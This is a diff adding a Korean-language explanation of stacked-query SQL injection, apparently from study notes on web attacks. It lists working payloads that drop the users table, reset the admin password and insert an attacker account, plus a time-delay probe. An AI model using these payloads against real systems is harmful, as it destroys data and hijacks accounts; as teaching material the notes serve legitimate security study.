@@ -421,3 +421,41 @@ Time-based Blind SQLi는\
 ```
 '; DROP TABLE users -- -
 ```
+그러면 데이터베이스는
+1. 원래 쿼리를 끝내고
+2. `DROP TABLE users`라는 **새로운 쿼리**를 이어서 실행함.
+
+**예시 흐름**
+1. Stacked Query 가능 여부 확인
+```
+'; SELECT 1 -- -
+```
+또는 시간 지연으로 확인 :
+```
+`; WAITFOR DELAY '0:0:5' -- -
+```
+
+2. 데이터 조작
+```
+'; UPDATE users SET password='hacked' WHERE username='admin' -- -
+```
+
+3. 데이터 삭제 또는 추가
+```
+'; DROP TABLE users -- -
+'; INSERT INTO users (username, password) VALUES ('attacker', '1234') -- -
+```
+
+**정상 쿼리** :
+```
+SELECT * FROM products WHERE id = 'userInput';
+```
+
+**공격자 쿼리** :
+```
+SELECT * FROM products WHERE id = '1'; UPDATE users SET password='hacked' WHERE username='admin' -- -'
+```
+- 첫 번째 쿼리 : 상품 조회
+- 두 번째 쿼리 : admin 비밀번호를 `hacked`로 변경
+
+한 번의 요청으로 **조회 + 수정**이 동시에 일어남.
